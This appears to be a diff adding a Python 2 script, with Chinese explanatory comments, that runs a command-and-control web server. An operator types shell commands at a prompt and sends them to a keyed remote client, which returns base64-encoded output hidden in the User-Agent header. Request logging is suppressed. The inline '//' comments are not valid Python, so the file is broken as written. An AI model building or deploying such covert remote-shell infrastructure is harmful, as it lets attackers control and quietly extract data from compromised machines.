@@ -1,0 +1,45 @@
+#!/usr/bin/python
+
+from uuid import uuid4
+from urlparse import urlparse, parse_qs
+from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
+
+serverPort = 80 //server端口
+secretkey = str(uuid4()) //生成用随机数组成的UUID
+
+class webServer(BaseHTTPRequestHandler):
+
+    def do_GET(self,):
+        useragent = self.headers.get('User-Agent').split('|')  //提取出响应头部的User-Agent头并删除|
+        querydata = parse_qs(urlparse(self.path).query) //分析URL中query组件的参数，返回一个key-value对应的字典格式
+        if 'key' in querydata: 
+            if querydata['key'][0] == secretkey: //如果客户端返回的UUID和服务端的UUID相同
+                self.send_response(200) //返回响应码为200
+                self.send_header("Content-type","text/html") //设置Content-type头为text/html
+                self.end_headers() //发送一个空白行，表面HTTP头响应结束
+
+                if len(useragent) == 2: //长度等于2
+                    response = useragent[1].split(',')[0]
+                    print(response.decode("base64")) //解码base64
+                    self.wfile.write("") //输出响应
+                    return
+                cmd = raw_input("$ ")
+                self.wfile.write("{}".format(cmd)) //输出响应
+                return
+        self.send_response(404) //若是上面的条件不成立，返回响应码为404
+        self.send_header("Content-type","text/html") //设置Content头为text/html
+        self.end_headers() //输出一个空白行，结束响应
+        self.wfile.write("Not Found") //返回Not Found
+        return
+
+    def log_message(self, format, *args):
+        return
+
+try:
+    server = HTTPServer(("", serverPort), webServer) //监听本机指定IP和端口
+    print("Server running on port: {}".format(serverPort))
+    print("Secret Key: {}".format(secretkey))
+    server.serve_forever() //开启webserver
+except KeyboardInterrupt:
+    server.socket.close()
+
